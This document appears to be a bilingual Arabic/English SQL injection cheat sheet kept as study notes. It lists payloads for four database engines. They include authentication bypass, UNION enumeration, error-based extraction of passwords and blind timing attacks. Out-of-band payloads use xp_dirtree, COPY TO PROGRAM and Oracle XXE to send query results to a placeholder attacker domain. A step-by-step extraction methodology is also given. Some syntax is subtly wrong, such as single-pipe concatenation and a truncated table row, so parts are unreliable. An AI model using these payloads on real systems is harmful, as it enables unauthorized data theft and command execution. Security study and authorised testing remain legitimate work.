# SQL Injection Cheat Sheet (منظم للمذاكرة)

---

# 1) String Concatenation (ربط النصوص)

| Database             | Syntax                                                           |
| -------------------- | ---------------------------------------------------------------- |
| Oracle               | `'foo' \| 'bar'`                                                 |
| Microsoft SQL Server | `'foo' + 'bar'`                                                  |
| PostgreSQL           | `'foo' \| 'bar'`                                                 |
| MySQL                | `'foo' 'bar'` _(يوجد مسافة بين النصين)_ أو `CONCAT('foo','bar')` |

---

# 2) Substring (استخراج جزء من النص)

> استخراج جزء من String ابتداءً من Position معين بطول معين.

**مثال:** ترجع `"ba"` من `"foobar"`.

|Database|Syntax|
|---|---|
|Oracle|`SUBSTR('foobar',4,2)`|
|Microsoft SQL Server|`SUBSTRING('foobar',4,2)`|
|PostgreSQL|`SUBSTRING('foobar',4,2)`|
|MySQL|`SUBSTRING('foobar',4,2)`|

---

# 3) Comments (التعليقات)

تستخدم لإنهاء الاستعلام الأصلي وتجاهل ما بعده.

|Database|Syntax|
|---|---|
|Oracle|`--comment`|
|Microsoft SQL Server|`--comment` أو `/*comment*/`|
|PostgreSQL|`--comment` أو `/*comment*/`|
|MySQL|`#comment` أو `-- comment` _(يوجد مسافة بعد --)_ أو `/*comment*/`|

---

# 4) Database Version (معرفة نوع وإصدار قاعدة البيانات)

|Database|Query|
|---|---|
|Oracle|`SELECT banner FROM v$version``SELECT version FROM v$instance`|
|Microsoft SQL Server|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

---

# 5) Database Contents (معرفة الجداول والأعمدة)

## Oracle

```sql
SELECT * FROM all_tables;

SELECT *
FROM all_tab_columns
WHERE table_name='TABLE_NAME';
```

## Microsoft SQL Server

```sql
SELECT * FROM information_schema.tables;

SELECT *
FROM information_schema.columns
WHERE table_name='TABLE_NAME';
```

## PostgreSQL

```sql
SELECT * FROM information_schema.tables;

SELECT *
FROM information_schema.columns
WHERE table_name='TABLE_NAME';
```

## MySQL

```sql
SELECT * FROM information_schema.tables;

SELECT *
FROM information_schema.columns
WHERE table_name='TABLE_NAME';
```

---

# 6) Conditional Errors (إظهار Error عند تحقق شرط)

## Oracle

```sql
SELECT CASE
WHEN (YOUR_CONDITION)
THEN TO_CHAR(1/0)
ELSE NULL
END
FROM dual;
```

## Microsoft SQL Server

```sql
SELECT CASE
WHEN (YOUR_CONDITION)
THEN 1/0
ELSE NULL
END;
```

## PostgreSQL

```sql
1 = (
SELECT CASE
WHEN (YOUR_CONDITION)
THEN 1/(SELECT 0)
ELSE NULL
END
)
```

## MySQL

```sql
SELECT IF(
YOUR_CONDITION,
(SELECT table_name FROM information_schema.tables),
'a'
);
```

---

# 7) Extracting Data via Visible Error Messages

## Microsoft SQL Server

```sql
SELECT 'foo'
WHERE 1=(SELECT 'secret');
```

Error:

```
Conversion failed when converting the varchar value 'secret' to data type int.
```

---

## PostgreSQL

```sql
SELECT CAST(
(SELECT password FROM users LIMIT 1)
AS int
);
```

Error:

```
invalid input syntax for integer: "secret"
```

---

## MySQL

```sql
SELECT 'foo'
WHERE 1=1
AND EXTRACTVALUE(
1,
CONCAT(0x5c,(SELECT 'secret'))
);
```

Error:

```
XPATH syntax error: '\secret'
```

---

# 8) Batched (Stacked) Queries

تنفيذ أكثر من Query في نفس الوقت.

|Database|Syntax|
|---|---|
|Oracle|❌ غير مدعوم|
|Microsoft SQL Server|`QUERY1; QUERY2`|
|PostgreSQL|`QUERY1; QUERY2`|
|MySQL|`QUERY1; QUERY2` _(قد لا يعمل في أغلب الحالات)_|

**ملاحظة:** في MySQL غالبًا لا يعمل إلا إذا كان التطبيق يستخدم بعض واجهات PHP أو Python التي تسمح بالاستعلامات المتعددة.

---

# 9) Time Delay

تأخير تنفيذ الاستعلام لمدة 10 ثوانٍ.

|Database|Query|
|---|---|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft SQL Server|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

---

# 10) Conditional Time Delay

إذا تحقق الشرط، انتظر 10 ثوانٍ.

## Oracle

```sql
SELECT CASE
WHEN (YOUR_CONDITION)
THEN 'a'||dbms_pipe.receive_message(('a'),10)
ELSE NULL
END
FROM dual;
```

## Microsoft SQL Server

```sql
IF (YOUR_CONDITION)
WAITFOR DELAY '0:0:10';
```

## PostgreSQL

```sql
SELECT CASE
WHEN (YOUR_CONDITION)
THEN pg_sleep(10)
ELSE pg_sleep(0)
END;
```

## MySQL

```sql
SELECT IF(
YOUR_CONDITION,
SLEEP(10),
'a'
);
```

---

# 11) DNS Lookup (Out-of-Band Interaction)

إجبار قاعدة البيانات على إرسال DNS Request إلى Burp Collaborator.

## Oracle (XXE)

```sql
SELECT EXTRACTVALUE(
xmltype(
'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM
"http://BURP-COLLABORATOR-SUBDOMAIN/">
%remote;
]>'
),
'/l'
)
FROM dual;
```

أو (يتطلب صلاحيات أعلى):

```sql
SELECT UTL_INADDR.get_host_address(
'BURP-COLLABORATOR-SUBDOMAIN'
);
```

---

## Microsoft SQL Server

```sql
exec master..xp_dirtree
'//BURP-COLLABORATOR-SUBDOMAIN/a';
```

---

## PostgreSQL

```sql
copy (SELECT '')
to program
'nslookup BURP-COLLABORATOR-SUBDOMAIN';
```

---

## MySQL (Windows)

```sql
LOAD_FILE(
'\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
);

SELECT ...
INTO OUTFILE
'\\\\BURP-COLLABORATOR-SUBDOMAIN\\a';
```

---

# 12) DNS Lookup with Data Exfiltration

إرسال البيانات المستخرجة داخل الـ DNS Request.

## Oracle

```sql
SELECT EXTRACTVALUE(
xmltype(
'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM
"http://'
||
(SELECT YOUR_QUERY_HERE)
||
'.BURP-COLLABORATOR-SUBDOMAIN/">
%remote;
]>'
),
'/l'
)
FROM dual;
```

---

## Microsoft SQL Server

```sql
declare @p varchar(1024);

set @p=(
SELECT YOUR_QUERY_HERE
);

exec(
'master..xp_dirtree "//'
+@p+
'.BURP-COLLABORATOR-SUBDOMAIN/a"'
);
```

---

## PostgreSQL

```sql
create or replace function f()
returns void
as $$
declare c text;
declare p text;

begin

SELECT into p
(
SELECT YOUR_QUERY_HERE
);

c :=
'copy (SELECT '''')
to program
''nslookup '
|| p ||
'.BURP-COLLABORATOR-SUBDOMAIN''';

execute c;

END;

$$ language plpgsql security definer;

SELECT f();
```

---

## MySQL (Windows)

```sql
SELECT YOUR_QUERY_HERE
INTO OUTFILE
'\\\\BURP-COLLABORATOR-SUBDOMAIN\\a';
```


---
---

# 13) Finding the Number of Columns (معرفة عدد الأعمدة)

## باستخدام ORDER BY

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
ORDER BY 4--
```

استمر في زيادة الرقم حتى يظهر Error.

آخر رقم **لم يظهر معه Error** = عدد الأعمدة.

---

## باستخدام UNION SELECT

```sql
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--
UNION SELECT NULL,NULL,NULL,NULL--
```

استمر بإضافة `NULL` حتى يختفي الخطأ.

عدد الـ `NULL` = عدد الأعمدة.

---

# 14) Finding Text Columns (معرفة الأعمدة التي تقبل النصوص)

بعد معرفة عدد الأعمدة، اختبر كل عمود.

مثال (3 أعمدة):

```sql
UNION SELECT 'a',NULL,NULL--
```

```sql
UNION SELECT NULL,'a',NULL--
```

```sql
UNION SELECT NULL,NULL,'a'--
```

إذا ظهر الحرف **a** في الصفحة أو اختفى الخطأ، فهذا العمود يقبل النصوص.

---

# 15) Common SQL Functions (أشهر دوال SQL)

## String Functions

```sql
SUBSTRING()
SUBSTR()
LEFT()
RIGHT()
CONCAT()
LOWER()
UPPER()
TRIM()
REPLACE()
```

---

## Length Functions

```sql
LENGTH()
LEN()
CHAR_LENGTH()
```

---

## ASCII Functions

```sql
ASCII()
CHAR()
CHR()
```

---

## Database Information

```sql
DATABASE()
CURRENT_DATABASE()
CURRENT_USER
USER()
SESSION_USER
VERSION()
@@VERSION
```

---

# 16) SQL Injection Types

|Type|Description|
|---|---|
|Error-based|استخراج البيانات من رسائل الخطأ|
|UNION-based|استخراج البيانات باستخدام UNION|
|Boolean-based Blind|الاعتماد على True / False|
|Time-based Blind|الاعتماد على Time Delay|
|Out-of-Band (OOB)|استخدام DNS أو HTTP عبر Burp Collaborator|
|Second-Order SQLi|يتم تنفيذ الـ Payload لاحقًا وليس مباشرة|

---

# 17) SQL Injection Methodology

```text
1. Find SQL Injection

↓

2. Identify Database Type

↓

3. Find Number of Columns

↓

4. Find Text Columns

↓

5. Extract Database Name

↓

6. Enumerate Tables

↓

7. Enumerate Columns

↓

8. Extract Data

↓

9. Escalate (إذا لزم الأمر)
```

---

# 18) Common Payloads

## Basic

```sql
'
''
"
""
```

---

## Comments

```sql
--
#
/**/
```

---

## Authentication Bypass

```sql
' OR 1=1--

' OR '1'='1'--

admin'--
```

---

## UNION

```sql
UNION SELECT

UNION ALL SELECT
```

---

## Enumeration

```sql
ORDER BY

NULL

information_schema

all_tables

all_tab_columns
```

---

## Blind

```sql
CASE WHEN

IF()

SLEEP()

pg_sleep()

WAITFOR DELAY

dbms_pipe.receive_message()
```

---

# 19) Database Fingerprinting

|If You See|Database|
|---|---|
|`SLEEP()`|MySQL|
|`pg_sleep()`|PostgreSQL|
|`WAITFOR DELAY`|Microsoft SQL Server|
|`dbms_pipe.receive_message()`|Oracle|
|`FROM dual`|Oracle|
|`@@version`|SQL Server / MySQL|
|`version()`|PostgreSQL|
|`||
|`+`|Microsoft SQL Server|
|`CONCAT()`|MySQL|

---

# 20) URL Encoding

|Encoded|Character|
|---|---|
|`%20`|Space|
|`%27`|`'`|
|`%22`|`"`|
|`%23`|`#`|
|`%2D%2D`|`--`|
|`%3B`|`;`|
|`%2F`|`/`|
|`%3D`|`=`|
|`%26`|`&`|
|`%3F`|`?`|

---

# 21) Oracle Quick Reference

```sql
FROM dual

||

XMLTYPE()

EXTRACTVALUE()

UTL_INADDR.get_host_address()

dbms_pipe.receive_message()

UTL_HTTP.REQUEST()
```

---

# 22) Database Comparison

| Feature       | Oracle                          | SQL Server                   | PostgreSQL                   | MySQL                        |
| ------------- | ------------------------------- | ---------------------------- | ---------------------------- | ---------------------------- |
| Version       | `v$version`                     | `@@version`                  | `version()`                  | `@@version`                  |
| Sleep         | `dbms_pipe.receive_message()`   | `WAITFOR DELAY`              | `pg_sleep()`                 | `SLEEP()`                    |
| Comments      | `--`                            | `--` `/* */`                 | `--` `/* */`                 | `#` `--` `/* */`             |
| Concat        | `\|`                            | `+`                          | `\|`                         | `CONCAT()`                   |
| Tables        | `all_tables`                    | `information_schema.tables`  | `information_schema.tables`  | `information_schema.tables`  |
| Columns       | `all_tab_columns`               | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` |
| DNS Lookup    | `EXTRACTVALUE()` / `UTL_INADDR` | `xp_dirtree`                 | `COPY TO PROGRAM`            | `LOAD_FILE()`                |
| Time Delay    | `dbms_pipe.receive_message()`   | `WAITFOR DELAY`              | `pg_sleep()`                 | `SLEEP()`                    |
| Default Table | `dual`                          | ❌                            | ❌                            | ❌                            |